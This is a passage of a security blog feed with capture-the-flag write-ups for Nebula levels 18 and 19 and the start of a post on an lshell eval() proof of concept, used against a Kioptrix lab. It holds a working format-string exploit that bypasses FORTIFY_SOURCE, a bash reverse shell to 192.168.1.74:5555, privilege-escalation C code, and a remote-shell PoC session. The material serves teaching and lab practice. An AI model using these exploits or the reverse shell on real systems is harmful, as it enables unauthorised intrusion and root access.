+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>level18@nebula:/home/flag18$ ./checksec.sh --file flag18
+</span><span class='line'>RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+</span><span class='line'>Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   flag18
+</span><span class='line'>level18@nebula:/home/flag18$ </span></code></pre></td></tr></table></div></figure>
+
+
+<p>On deeper inspection of the code, it appears there are several logic flaws that could allow simple execution of a root shell.</p>
+
+<p>The first issue is that there&rsquo;s no restriction on what file we&rsquo;re debugging to, so long as we&rsquo;ve got the privileges required to open it.  In this case, this means we can debug to the same file that we&rsquo;re checking passwords against.  Since we can&rsquo;t actually read the file, we need to infer:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>level18@nebula:/home/flag18$ ./flag18 -d /home/flag18/password 
+</span><span class='line'>^Clevel18@nebula:/home/flag18$ ls -lh password
+</span><span class='line'>-rw------- 1 flag18 flag18 31 2013-03-20 00:38 password
+</span><span class='line'>level18@nebula:/home/flag18$ echo Starting up. Verbose level = 0 | wc -c
+</span><span class='line'>31
+</span><span class='line'>level18@nebula:/home/flag18$ </span></code></pre></td></tr></table></div></figure>
+
+
+<p>So we read without error and we know the exact data in the file.  The problem with this is that it strips newlines, and with fgets we don&rsquo;t have a nice way of inserting them.</p>
+
+<p>The second issue I discovered involved the command site exec, which doesn&rsquo;t properly format output, and won&rsquo;t append newlines (which may be used to further the first issue).</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>level18@nebula:/home/flag18$ ./flag18 -d /tmp/dbg 
+</span><span class='line'>site exec %n
+</span><span class='line'>*** %n in writable segment detected ***
+</span><span class='line'>Aborted
+</span><span class='line'>level18@nebula:/home/flag18$ ./flag18 -d /tmp/dbg 
+</span><span class='line'>site exec %4$x
+</span><span class='line'>*** invalid %N$ use detected ***
+</span><span class='line'>Aborted
+</span><span class='line'>level18@nebula:/home/flag18$</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This means that our binary was likely compiled with <a href="https://wiki.edubuntu.org/ToolChain/CompilerFlags">FORTIFY_SOURCE=2</a>.  <a href="http://gcc.gnu.org/ml/gcc-patches/2004-09/msg02055.html">Here&rsquo;s</a> the patch that explains what it is and prevents, and the differences between 1 and 2.  Because I don&rsquo;t take doors slammed in my face very well, and it&rsquo;s late, it&rsquo;s time to break out the <a href="http://www.phrack.org/issues.html?issue=67&amp;id=9">phrack</a>:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>level18@nebula:/home/flag18$ gdb ./flag18 
+</span><span class='line'>Reading symbols from /home/flag18/flag18...(no debugging symbols found)...done.
+</span><span class='line'>(gdb) r -d /tmp/dbg 
+</span><span class='line'>Starting program: /home/flag18/flag18 -d /tmp/dbg
+</span><span class='line'>site exec %1$*269168516$x %1073741824$                            
+</span><span class='line'>
+</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
+</span><span class='line'>0x0028b359 in vfprintf () from /lib/i386-linux-gnu/libc.so.6
+</span><span class='line'>(gdb) </span></code></pre></td></tr></table></div></figure>
+
+
+<p>Exploitation of this wasn&rsquo;t trivial, but it was eye-opening into some of the things you can accomplish with format string vulnerabilities.  Because our binary was compiled with FORTIFY_SOURCE, there are essentially two things we need to do: disable the FORTIFY flag, and disable the argument filler.  The argument filler essentially sets every argument in arguments[argc] to -1, then fills in the user supplied arguments.  Any -1&rsquo;s remaining will cause an error.  At a high level we&rsquo;re doing this:
++ Disable FORTIFY_SOURCE flag
++ Modify nargs to blow up
++ Be happy</p>
+
+<p>The Phrack article does a better job of explaining this than I do, so if you&rsquo;d like an in-depth analysis of all this, follow the article.  Anyway &mdash; finding and disabling FORTIFY_SOURCE:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>level18@nebula:/home/flag18$ gdb ./flag18 
+</span><span class='line'>Reading symbols from /home/flag18/flag18...(no debugging symbols found)...done.
+</span><span class='line'>(gdb) b vfprintf
+</span><span class='line'>Function "vfprintf" not defined.
+</span><span class='line'>Make breakpoint pending on future shared library load? (y or [n]) y
+</span><span class='line'>Breakpoint 1 (vfprintf) pending.
+</span><span class='line'>(gdb) r -d /tmp/dbg
+</span><span class='line'>site exec %1$*2222848$x %1073741824$
+</span><span class='line'>
+</span><span class='line'>Breakpoint 1, 0x00171140 in vfprintf () from /lib/i386-linux-gnu/libc.so.6
+</span><span class='line'>(gdb) c
+</span><span class='line'>Continuing.
+</span><span class='line'>
+</span><span class='line'>Breakpoint 1, 0x00171140 in vfprintf () from /lib/i386-linux-gnu/libc.so.6
+</span><span class='line'>(gdb) tb *(vfprintf+4649)
+</span><span class='line'>Temporary breakpoint 2 at 0x172359
+</span><span class='line'>(gdb) c
+</span><span class='line'>Continuing.
+</span><span class='line'>
+</span><span class='line'>Breakpoint 1, 0x00171140 in vfprintf () from /lib/i386-linux-gnu/libc.so.6
+</span><span class='line'>(gdb) x/x $eax
+</span><span class='line'>0xbfffef60:    0xfbad8004
+</span><span class='line'>(gdb) x/20wx $eax
+</span><span class='line'>0xbfffef60:    0xfbad8004    0xbffff4f8    0x0017192c    0xbffff528
+</span><span class='line'>0xbfffef70:    0xbfffcf60    0xbfffcf60    0xbfffef60    0x00000000
+</span><span class='line'>0xbfffef80:    0x00000000    0x00000000    0x00000027    0x08049017
+</span><span class='line'>0xbfffef90:    0xfbad8004    0x00000000    0x00000000    0x00000004
+</span><span class='line'>0xbfffefa0:    0xbfffcf90    0xbf00cfaf    0x00000000    0x00000000
+</span><span class='line'>(gdb) x/wx 0xbfffef9c
+</span><span class='line'>0xbfffef9c:    0x00000004
+</span><span class='line'>(gdb) </span></code></pre></td></tr></table></div></figure>
+
+
+<p>There&rsquo;s obviously a bit of cheating here, but bare with me: we&rsquo;re essentially breaking on vfprintf, which receives a file pointer, a formatter, and an argument list.  We then take a peek at the stack, note our file pointer, and find the flag inside (0x000000004).  We know need to calculate the offset:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) x/wx 0xbfffef9c
+</span><span class='line'>0xbfffef9c:    0x00000004
+</span><span class='line'>(gdb) p/d ((0xbfffef9c-$ecx)&0xffffffff)/4
+</span><span class='line'>$1 = 2847
+</span><span class='line'>(gdb)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And accounting for off-by-one, it&rsquo;s 2848.  So:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) r -d /tmp/dbg
+</span><span class='line'>The program being debugged has been started already.
+</span><span class='line'>Start it from the beginning? (y or n) y
+</span><span class='line'>Starting program: /home/flag18/flag18 -d /tmp/dbg
+</span><span class='line'>site exec %1$*2848$x %1073741824$
+</span><span class='line'>
+</span><span class='line'>Breakpoint 1, 0x00171140 in vfprintf () from /lib/i386-linux-gnu/libc.so.6
+</span><span class='line'>(gdb) tb *(vfprintf+4649)
+</span><span class='line'>Temporary breakpoint 4 at 0x172359
+</span><span class='line'>(gdb) c
+</span><span class='line'>Continuing.
+</span><span class='line'>
+</span><span class='line'>Temporary breakpoint 4, 0x00172359 in vfprintf () from /lib/i386-linux-gnu/libc.so.6
+</span><span class='line'>(gdb) x/i $eip
+</span><span class='line'>=&gt; 0x172359 &lt;vfprintf+4649&gt;:    mov    DWORD PTR [edx+eax*4],0x0
+</span><span class='line'>(gdb) x/wx $ecx+$eax*4
+</span><span class='line'>0xbfffef9c:    0x00000004
+</span><span class='line'>(gdb)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Great, we&rsquo;ve got the correct value for clobbering that flag.  Now we need to find the offset for clobbering nargs:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) find 0xbfff0000, 0xbffffff0, 0xdeadbeef
+</span><span class='line'>0xbfff5568
+</span><span class='line'>0xbfff59ec
+</span><span class='line'>2 patterns found.
+</span><span class='line'>(gdb) -r 
+</span><span class='line'>Starting program: /home/flag18/flag18 -d /tmp/dbg
+</span><span class='line'>site exec %1$*283434$x %1073741824$
+</span><span class='line'>
+</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
+</span><span class='line'>0x00172359 in vfprintf () from /lib/i386-linux-gnu/libc.so.6
+</span><span class='line'>(gdb) p/d (0xbfff5568-$ecx)/4 + 1
+</span><span class='line'>$6 = 479
+</span><span class='line'>(gdb) </span></code></pre></td></tr></table></div></figure>
+
+
+<p>I got stuck here for awhile, and after some googling I discovered someone had already solved this level this way!  So I took <a href="http://v0ids3curity.blogspot.com/2012/09/exploit-exercise-format-string.html">his</a> advice and created an environmental variable that would lower the stack address and not segfault.  The final phase is now upon us; smuggling shellcode in.  The Phrack article gets a little hairy at this point, so instead of screwing around with adjusting stack offsets, I decided to just take the route that v0id took in his blog post.  His process involves setting the loggedin variable by way of taking control of uninitialized stack memory, thanks to <a href="http://vulnfactory.org/blog/2010/04/08/controlling-uninitialized-memory-with-ld_preload/">Rosenburg&rsquo;s</a> fantastic post on this topic:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>site exec |%20$n| %1$*479$ %1$*2848$ %1073741824$
+</span><span class='line'>
+</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
+</span><span class='line'>0x00d7af00 in vfprintf () from /lib/i386-linux-gnu/libc.so.6
+</span><span class='line'>(gdb) i r
+</span><span class='line'>eax            0x41414141    1094795585
+</span><span class='line'>ecx            0x0    0
+</span><span class='line'>edx            0x1    1
+</span><span class='line'>ebx            0xeafff4    15400948
+</span><span class='line'>esp            0xbfdb8b9c    0xbfdb8b9c
+</span><span class='line'>ebp            0xbfdb97e8    0xbfdb97e8
+</span><span class='line'>esi            0xbfdbb810    -1076119536
+</span><span class='line'>edi            0xbfdb8bc0    -1076130880
+</span><span class='line'>eip            0xd7af00    0xd7af00 &lt;vfprintf+11728&gt;
+</span><span class='line'>eflags         0x10246    [ PF ZF IF RF ]
+</span><span class='line'>cs             0x73    115
+</span><span class='line'>ss             0x7b    123
+</span><span class='line'>ds             0x7b    123
+</span><span class='line'>es             0x7b    123
+</span><span class='line'>fs             0x0    0
+</span><span class='line'>gs             0x33    51
+</span><span class='line'>(gdb)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So we just need to find the loggedin variable, then call shell on it:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) x/2i $eip
+</span><span class='line'>=&gt; 0x8048928 &lt;main+376&gt;:    cmp    DWORD PTR ds:0x804b0b4,0x1
+</span><span class='line'>   0x804892f &lt;main+383&gt;:    jle    0x804894d &lt;main+413&gt;
+</span><span class='line'>(gdb) x/x 0x804b0b4
+</span><span class='line'>0x804b0b0 &lt;globals+4&gt;:    0x00000000</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Stick that into our LD_PRELOAD, sprinkle in a bit of stack alignment, and&hellip;</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>level18@nebula:/home/flag18$ export LD_PRELOAD=`python -c 'print "\xb4\xb0\x04\x08"*8000'`
+</span><span class='line'>level18@nebula:/home/flag18$ gdb ./flag18
+</span><span class='line'>(gdb) r -d /tmp/dbg
+</span><span class='line'>site exec |%20$n| %1$*479$ %1$*2848$ %1073741824$
+</span><span class='line'>shell
+</span><span class='line'>./flag18: -d: invalid option
+</span><span class='line'>Usage:    ./flag18 [GNU long option] [option] ...
+</span><span class='line'>    ./flag18 [GNU long option] [option] script-file ...
+</span><span class='line'>GNU long options:
+</span><span class='line'>    --debug
+</span><span class='line'>    --debugger
+</span><span class='line'>    --dump-po-strings
+</span><span class='line'>    --dump-strings
+</span><span class='line'>    --help
+</span><span class='line'>    --init-file
+</span><span class='line'>    --login
+</span><span class='line'>    --noediting
+</span><span class='line'>    --noprofile
+</span><span class='line'>    --norc
+</span><span class='line'>    --posix
+</span><span class='line'>    --protected
+</span><span class='line'>    --rcfile
+</span><span class='line'>    --restricted
+</span><span class='line'>    --verbose
+</span><span class='line'>    --version
+</span><span class='line'>Shell options:
+</span><span class='line'>    -irsD or -c command or -O shopt_option        (invocation only)
+</span><span class='line'>    -abefhkmnptuvxBCHP or -o option
+</span><span class='line'>level18@nebula:/home/flag18$ </span></code></pre></td></tr></table></div></figure>
+
+
+<p>Success!  It&rsquo;s clearly passing in the -d flag to sh, so&hellip;</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>level18@nebula:/home/flag18$ ./flag18 --rcfile -d /tmp/dbg
+</span><span class='line'>site exec |%20$n| %1$*479$ %1$*2848$ %1073741824$
+</span><span class='line'>shell
+</span><span class='line'>/tmp/dbg: line 1: Starting: command not found
+</span><span class='line'>/tmp/dbg: line 2: syntax error near unexpected token `||'
+</span><span class='line'>/tmp/dbg: line 2: `|| %134525108%-1274542928 %'
+</span><span class='line'>level18@nebula:/home/flag18$ cat /tmp/Starting
+</span><span class='line'>#!/bin/bash
+</span><span class='line'>/bin/bash -i &gt; /dev/tcp/192.168.1.74/5555 0&gt;&1
+</span><span class='line'>level18@nebula:/home/flag18$ export PATH=/tmp:$PATH
+</span><span class='line'>level18@nebula:/home/flag18$ ./flag18 --rcfile -d /tmp/dbg
+</span><span class='line'>site exec |%20$n| %1$*479$ %1$*2848$ %1073741824$
+</span><span class='line'>shell
+</span><span class='line'>flag18@nebula:/home/flag18$ </span></code></pre></td></tr></table></div></figure>
+
+
+<p>A shell was waiting for me on 192.168.1.74:5555.  Lots of subtle intricacies here, but really quite fun.</p>
+
+<p>The third issue is the following snippet:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>26  fp = fopen(PWFILE, "r");
+</span><span class='line'> 27  if(fp) {
+</span><span class='line'> 28    char file[64];
+</span><span class='line'> 29
+</span><span class='line'> 30    if(fgets(file, sizeof(file) - 1, fp) == NULL) {
+</span><span class='line'> 31      dprintf("Unable to read password file %s\n", PWFILE);
+</span><span class='line'> 32      return;
+</span><span class='line'> 33    }
+</span><span class='line'> 34                fclose(fp);
+</span><span class='line'> 35    if(strcmp(pw, file) != 0) return;    
+</span><span class='line'> 36  }
+</span><span class='line'> 37  dprintf("logged in successfully (with%s password file)\n", 
+</span><span class='line'> 38    fp == NULL ? "out" : "");
+</span><span class='line'> 39  
+</span><span class='line'> 40  globals.loggedin = 1;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>If the application fails to read PWFILE, the flow will automatically assume the user is logged in.  This appears to be either the easy or intermediate way, as source code explicitly calls this case out (with%s password file).  This could be defeated by opening up a ton of files and running the binary, effectively erroring out fopen and getting the loggedin flag set.</p>
+
+<h3>Level 19</h3>
+
+
+<p>We now arrive at the final level of Nebula.  This level checks the owner of the calling process and, if root, pops a shell.  This level was kinda neat because it requires you to have an understanding of how forking and parent/child processing works; and if you know that, it&rsquo;s pretty easy.  In this level we&rsquo;re going to exploit an <a href="http://www.geekride.com/orphan-zombie-process/">orphan process</a> and its reclamation process.  When a parent of a child process terminates, the child process stays alive and becomes an orphan process.  This orphan process is automatically reclaimed by an init process:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Parent generates child process:
+</span><span class='line'>            -- child
+</span><span class='line'>           /
+</span><span class='line'>parent ---/
+</span><span class='line'>
+</span><span class='line'>Parent dies:
+</span><span class='line'>        -- child
+</span><span class='line'>       X
+</span><span class='line'>x ----/
+</span><span class='line'>
+</span><span class='line'>init process discovers child and adopts:
+</span><span class='line'>         -- child
+</span><span class='line'>        /
+</span><span class='line'>init---/</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So we want to fork off a process and kill the parent before it calls flag19.  Then, when it goes to stat the process, it will stat init instead of us thereby assuming the role of root.  Here&rsquo;s the code for achieving that:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>#include &lt;stdlib.h&gt;
+</span><span class='line'>
+</span><span class='line'>void main(void){
+</span><span class='line'>    pid_t pid;
+</span><span class='line'>    char cmd[]   = "/home/flag19/flag19";
+</span><span class='line'>    char *argv[] = {"/bin/sh", "-c", "/bin/getflag &gt; /tmp/flagged"};
+</span><span class='line'>
+</span><span class='line'>    switch( pid = fork() ){
+</span><span class='line'>        case -1:
+</span><span class='line'>            perror("failed to fork\n");
+</span><span class='line'>        case 0:
+</span><span class='line'>            // execute command when parent dies
+</span><span class='line'>            sleep(2);
+</span><span class='line'>            execvp(cmd, argv);
+</span><span class='line'>        default:
+</span><span class='line'>            sleep(1); // wait a sec
+</span><span class='line'>            exit(1); // ok kill parent
+</span><span class='line'>        }
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And flag was waiting for us in <code>/tmp/flagged</code>.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[lshell 0.9.15 pathing vulnerability]]></title>
+    <link href="http://hatRiot.github.io/blog/2012/12/30/lshell-0.9.15-pathing-vulnerability/"/>
+    <updated>2012-12-30T22:43:42-07:00</updated>
+    <id>http://hatRiot.github.io/blog/2012/12/30/lshell-0.9.15-pathing-vulnerability</id>
+    <content type="html"><![CDATA[<p>While working through Kioptrix level 4, I stumbled into <a href="https://github.com/ghantoos/lshell">lshell</a>, a limited shell environment developed in Python.  I don&rsquo;t want to walk through the vulnerability again, but at a high level versions &lt;= 0.9.15 are vulnerable to an unsanitized eval() call with user supplied input.  I couldn&rsquo;t find a working PoC, so I wrote one.</p>
+
+<p>This will verify the install and spawn a pseudo-shell for running commands on the remote host.  While it may be more beneficial to just log in and run the exploit to spawn /bin/bash, this is a nice hacky way to quickly enumerate and tool around on the back end:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@bt:~/kioptrix_l4# python lshell_remote.py john ****** 192.168.1.39
+</span><span class='line'>[!] .............................
+</span><span class='line'>[!] lshell &lt;= 0.9.15 remote shell.
+</span><span class='line'>[!] note: you can also ssh in and execute '/bin/bash'
+</span><span class='line'>[!] .............................
+</span><span class='line'>[!] Checking host 192.168.1.39...
+</span><span class='line'>[+] vulnerable lshell found, preparing pseudo-shell...
+</span><span class='line'>$ id
+</span><span class='line'>uid=1001(john) gid=1001(john) groups=115(admin),1001(john)
+</span><span class='line'>$ ls -l
+</span><span class='line'>total 48
+</span><span class='line'>-rwxr-xr-x 1 john john  1544 2009-01-20 19:51 install.sh
+</span><span class='line'>-rw-r--r-- 1 john john  7715 2009-01-20 19:06 lib_mysqludf_sys.c
+</span><span class='line'>-rw-r--r-- 1 john john  9934 2009-01-21 19:42 lib_mysqludf_sys.html
+</span><span class='line'>-rwxr-xr-x 1 john john 12896 2009-01-19 04:11 lib_mysqludf_sys.so
+</span><span class='line'>-rw-r--r-- 1 john john  1647 2009-01-21 19:43 lib_mysqludf_sys.sql
+</span><span class='line'>-rw-r--r-- 1 john john   122 2009-01-19 04:11 Makefile
+</span><span class='line'>$ ls -l | grep 'Makefile'
+</span><span class='line'>-rw-r--r-- 1 john john   122 2009-01-19 04:11 Makefile
+</span><span class='line'>$ exit
+</span><span class='line'>root@bt:~/kioptrix_l4#</span></code></pre></td></tr></table></div></figure>
+
+
+<p>You can run pretty much everything except for binary files; this is because of the shell environment changing. I wasn&rsquo;t able to figure out a clean way to attach a TTY to the stdin/stdout/stderr, so if anyone knows of a way to do this with Paramiko, drop me a message.  I&rsquo;ll take any bug reports as well.  This requires Paramiko libraries to be installed; tested with Python 2.7.x.</p>
+
+<p><a href="http://pastebin.com/r7LCdeTC">Pastebin</a> link for download and code:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
